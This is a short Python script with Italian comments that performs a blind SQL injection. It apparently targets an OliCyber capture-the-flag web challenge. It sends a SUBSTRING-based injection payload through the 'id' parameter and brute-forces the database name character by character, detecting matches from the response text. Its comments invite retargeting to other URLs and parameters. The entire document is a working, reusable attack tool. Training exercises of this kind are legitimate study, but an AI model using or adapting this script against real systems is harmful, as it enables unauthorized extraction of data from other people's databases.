import requests
import string

# Configurazione del target
URL = "http://web-17.challs.olicyber.it/blind"  # Modifica con l'URL della challenge
INJECTION_POINT = "' OR SUBSTRING((SELECT database()),{pos},1)='{char}' -- "

# Set di caratteri da testare
CHARSET = string.ascii_letters + string.digits + "_{}"

def extract_data():
    extracted = ""
    
    for i in range(1, 50):  # Numero massimo di caratteri da estrarre
        for char in CHARSET:
            payload = INJECTION_POINT.format(pos=i, char=char)
            response = requests.get(URL, params={"id": payload})  # Modifica i parametri secondo il caso

            if "Success" in response.text:  # Modifica in base all'indicazione del successo
                extracted += char
                print(f"[+] Estratto finora: {extracted}")
                break  # Passa al carattere successivo

        else:
            print("[!] Fine dei dati.")
            break  # Interrompe se non trova più caratteri

    return extracted

if __name__ == "__main__":
    db_name = extract_data()
    print(f"[✅] Nome del database: {db_name}")
